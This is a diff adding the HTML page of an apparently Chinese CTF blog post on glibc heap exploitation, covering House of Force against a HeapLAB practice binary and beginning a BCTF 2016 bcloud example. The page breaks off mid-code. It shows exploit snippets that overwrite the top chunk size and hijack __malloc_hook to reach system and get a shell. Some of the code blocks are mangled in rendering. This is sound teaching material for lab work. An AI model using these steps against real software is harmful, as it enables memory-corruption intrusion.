@@ -1,0 +1,859 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/f_128x128.jpg">
+  <link rel="icon" href="/img/f_128x128.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ferity-Fan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Heaphttps:&#x2F;&#x2F;www.cnblogs.com&#x2F;luoleqi&#x2F;p&#x2F;11801400.html Structmalloc_chunkheap_infomalloc_stateFunctions and MacrosMacrosFunctionsArenaVulnerableHouse of Force概述用一个较大的值来重写top_chunk的大小字段，然后请求足够的内存来弥补顶块和目标数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ferity-Fan&#39;s Blog">
+<meta property="og:url" content="https://ferity-fan.github.io/2022/09/06/Heap/index.html">
+<meta property="og:site_name" content="Ferity-Fan&#39;s Blog">
+<meta property="og:description" content="Heaphttps:&#x2F;&#x2F;www.cnblogs.com&#x2F;luoleqi&#x2F;p&#x2F;11801400.html Structmalloc_chunkheap_infomalloc_stateFunctions and MacrosMacrosFunctionsArenaVulnerableHouse of Force概述用一个较大的值来重写top_chunk的大小字段，然后请求足够的内存来弥补顶块和目标数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814132821567.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814133216729.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220816100317563.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220816101120303.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814164430494.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814182744179.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814194641198.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814212052885.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814212638115.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814214814810.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820160146712.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820161049541.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820162024274.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820164643151.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820181022737.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820173211603.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820173412011.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820174021017.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820174213853.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820175408919.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220820184826255.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220821113749445.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220821114003739.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220821115406447.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220821115524129.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220821115602029.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220821115655834.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220821120333916.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220903173420886.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220903173447945.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220903173735492.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220903174353252.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220903175411826.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220903181246083.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220903182117957.png">
+<meta property="og:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220903182811281.png">
+<meta property="article:published_time" content="2022-09-06T07:49:44.011Z">
+<meta property="article:modified_time" content="2022-09-06T07:18:59.389Z">
+<meta property="article:author" content="Ferity-Fan">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ferity-fan.github.io/2022/09/06/Heap/Heap.assets/image-20220814132821567.png">
+  
+  
+  
+  <title>Ferity-Fan&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ferity-fan.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c2EbwsEz4vyQs2bqhNhwQHSS-gzGzoHsz","app_key":"7YTAevfoRuVqiwIQhf4uMsFe","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ferity-Fan&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-09-06 15:49" pubdate>
+          2022年9月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          27k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          225 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html">https://www.cnblogs.com/luoleqi/p/11801400.html</a></p>
+<h2 id="Struct"><a href="#Struct" class="headerlink" title="Struct"></a>Struct</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><h2 id="Functions-and-Macros"><a href="#Functions-and-Macros" class="headerlink" title="Functions and Macros"></a>Functions and Macros</h2><h3 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h3><h3 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h3><h2 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h2><h2 id="Vulnerable"><a href="#Vulnerable" class="headerlink" title="Vulnerable"></a>Vulnerable</h2><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>用一个较大的值来重写top_chunk的大小字段，然后请求足够的内存来弥补顶块和目标数据之间的差距 。以这种方式进行的分配可以环绕VA空间，使得这种技术可以以比堆更低的地址为目标地址。</p>
+<h4 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h4><p>在GLIBC版本&lt;2.29中，top chunk 大小字段在分配期间不受任何完整性检查。如果一个top chunk大小 的字段被覆盖，例如溢出并被替换成一个大的值，那么从该top chunk的后续分配可能会与使用中的内存重叠。在GLIBC&lt;2.30的版本中，从一个被破坏的top chunk中分配的非常大的内存可以环绕VA空间。</p>
+<p>例如，一个top chunk 从地址0x405000开始，驻留在程序数据部分的地址0x404000的目标数据必须被覆盖。使用溢出覆盖顶top chunk 大小字段，将其替换为0xffffffffffffff1的值。接下来，计算将top chunk 移动到目标之前的地址所需的字节数。总数是0xffffffffffffffffff-0x405000字节，以达到VA空间的末端，然后是0x404000-0x20个字节，以在目标地址之前停止。<br>在这个请求top chunk得到服务后，下一个申请的块将与目标数据重叠。</p>
+<h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><ul>
+<li><p>GLIBC 2.29版引入了顶部块大小字段的合理性检查。<a target="_blank" rel="noopener" href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=9431108626cdc0b5c1972ee00126228c8dd7166f;hp=e247c77b7d4de26e0f2fbec16e352889bac3781b;hb=30a17d8c95fbfb15c52d1115803b63aaa73a285c;hpb=34f86d61687457aa57d40cf3c230ca8404d40e45">link</a></p>
+<p><img src="Heap.assets/image-20220814132821567.png" srcset="/img/loading.gif" lazyload alt="image-20220814132821567"></p>
+</li>
+<li><p>GLIBC 2.30版引入了最大分配大小检查，它限制了 house of force”可以弥补的差距大小。<a target="_blank" rel="noopener" href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=0e3d4dd5163f5fa8fb07b71fb7e318e7b10f5cfd;hp=801ba1f499b566e677b763fc84f8ba86f4f7ccd0;hb=9bf8e29ca136094f73f69f725f15c51facc97206;hpb=52faba65f84ee5a8d82ff813bcfa0ee5f4d480cf">link</a></p>
+<p><img src="Heap.assets/image-20220814133216729.png" srcset="/img/loading.gif" lazyload alt="image-20220814133216729"></p>
+</li>
+</ul>
+<h4 id="示例一：house-of-force"><a href="#示例一：house-of-force" class="headerlink" title="示例一：house_of_force"></a>示例一：house_of_force</h4><blockquote>
+<p>文件详见附件 <a href="attachment/house_of_force/house_of_force">house_of_force</a></p>
+</blockquote>
+<h5 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h5><ul>
+<li>修改target的值</li>
+<li>获取shell</li>
+</ul>
+<h5 id="检查安全措施"><a href="#检查安全措施" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/house_of_force]<br>└─$ checksec house_of_force                                 <br>[*] &#x27;/home/fanya/Desktop/heap/heaplab/part1/house_of_force/house_of_force&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>    RUNPATH:  &#x27;../.glibc/glibc_2.28_no-tcache&#x27;<br></code></pre></td></tr></table></figure>
+
+<h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p>程序在运行时已给出libc地址及heap地址。</p>
+<p>在<code>read(0, m_array[index++], v5 + 8);</code>中明显的溢出8个字节。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *m; <span class="hljs-comment">// [rsp+18h] [rbp-38h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  House of Force&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  m = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x88</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap @ %p\n&quot;</span>, m - <span class="hljs-number">16</span>);<br>  <span class="hljs-built_in">free</span>(m);<br>  <span class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">4LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) target&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\ntarget: %s\n&quot;</span>, target);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        v4 = read_num();<br>        m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(v4);<br>        <span class="hljs-keyword">if</span> ( m_array[index] )<br>        &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>          v5 = malloc_usable_size(m_array[index]);<br>          read(<span class="hljs-number">0</span>, m_array[index++], v5 + <span class="hljs-number">8</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><ul>
+<li>由于堆上输入的时候恰有8个字节的溢出，修改top_chunk，从而达到任意地址写。</li>
+<li>修改__malloc_hook 为system的地址。</li>
+</ul>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
+<li><p>使用8字节溢出修改top_chunk的size为0xffffffffffffffff</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">malloc(<span class="hljs-number">24</span>, <span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">24</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)) <br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220816100317563.png" srcset="/img/loading.gif" lazyload alt="image-20220816100317563"></p>
+</li>
+<li><p>计算与目标地址的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Calculate the &quot;wraparound&quot; distance between two addresses.                                             </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delta</span>(<span class="hljs-params">x, y</span>):                                                                                             <span class="hljs-keyword">return</span> (<span class="hljs-number">0xffffffffffffffff</span> - x) + y <br>distance = delta(heap + <span class="hljs-number">0x20</span>, elf.sym.target - <span class="hljs-number">0x20</span>)<br><span class="hljs-comment"># heap -&gt; heap addr 0x20 -&gt;first chunk size</span><br>distance = (libc.sym.__malloc_hook - <span class="hljs-number">0x20</span>) - (heap + <span class="hljs-number">0x20</span>)<br></code></pre></td></tr></table></figure></li>
+<li><p>创建chunk，达到任意地址写</p>
+<ul>
+<li><p>modify_target</p>
+<pre><code class="hljs"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">	  malloc(distance, <span class="hljs-string">b&quot;a&quot;</span>)                                                                               malloc(<span class="hljs-number">24</span>, <span class="hljs-string">b&#x27;aaaaaaa&#x27;</span>)<br><br>![image-<span class="hljs-number">20220816100752788</span>](Heap.assets/image-<span class="hljs-number">20220816100752788.</span>png)<br><br>- drop shell<br><br>  ~~~python<br>  malloc(distance, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>  malloc(<span class="hljs-number">24</span>, p64(libc.sym.system))<br>  cmd = heap + <span class="hljs-number">0x30</span><br>  malloc(cmd, <span class="hljs-string">b&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+</code></pre>
+<p><img src="Heap.assets/image-20220816101120303.png" srcset="/img/loading.gif" lazyload alt="image-20220816101120303"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="示例二：BCTF-2016-bcloud"><a href="#示例二：BCTF-2016-bcloud" class="headerlink" title="示例二：BCTF 2016  bcloud"></a>示例二：BCTF 2016  bcloud</h4><blockquote>
+<p>文件详见附件 <a href="attachment/bctf_2016_bcloud/bcloud">bcloud</a></p>
+</blockquote>
+<h5 id="检查安全措施-1"><a href="#检查安全措施-1" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><p><img src="Heap.assets/image-20220814164430494.png" srcset="/img/loading.gif" lazyload alt="image-20220814164430494"></p>
+<h5 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h5><ul>
+<li><p>将程序打完注释后为<a href="attachment/bctf_2016_bcloud/bcloud.idb">bcloud.idb</a></p>
+</li>
+<li><p>在<code>my_input</code>函数中在末尾 a2 的位置加入一个<code>\x00</code>, 而在name_init中s本为64的大小，<code>my_input</code>也是64，但会在65的位置加一个<code>\x00</code>, 但是由于后面的v2赋值的操作，将<code>\x00</code>覆盖为了别的值，而且会在后面的<code>some_output</code>泄露出v2的堆地址。由于字符串的结束标志为<code>\x00</code>，所以<code>strcpy </code>和 <code>puts</code> 函数都会对这个v2的堆地址进行操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">my_input</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">char</span> a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+1Bh] [ebp-Dh] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1u</span>) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> ( buf == a3 )<br>      <span class="hljs-keyword">break</span>;<br>    *(_BYTE *)(a1 + i) = buf;<br>  &#125;<br>  *(_BYTE *)(i + a1) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">unsigned</span> <span 